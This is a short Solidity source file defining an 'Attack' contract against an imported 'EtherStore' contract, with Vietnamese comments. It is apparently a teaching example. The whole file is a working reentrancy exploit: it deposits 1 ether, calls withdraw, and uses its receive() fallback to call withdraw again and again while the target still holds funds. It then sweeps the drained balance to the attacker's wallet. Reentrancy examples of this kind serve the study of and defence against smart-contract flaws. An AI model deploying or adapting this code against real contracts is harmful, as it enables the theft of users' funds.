// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;
    address payable public attacker;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);

        attacker = payable(msg.sender);
    }

    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdraw() public {
        // Chỉ có "attacker" mới được quyền gọi hàm này
        require(msg.sender == attacker, "Only the attacker can withdraw funds.");

        // Chuyển toàn bộ số dư của hợp đồng này về ví của attacker
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }
}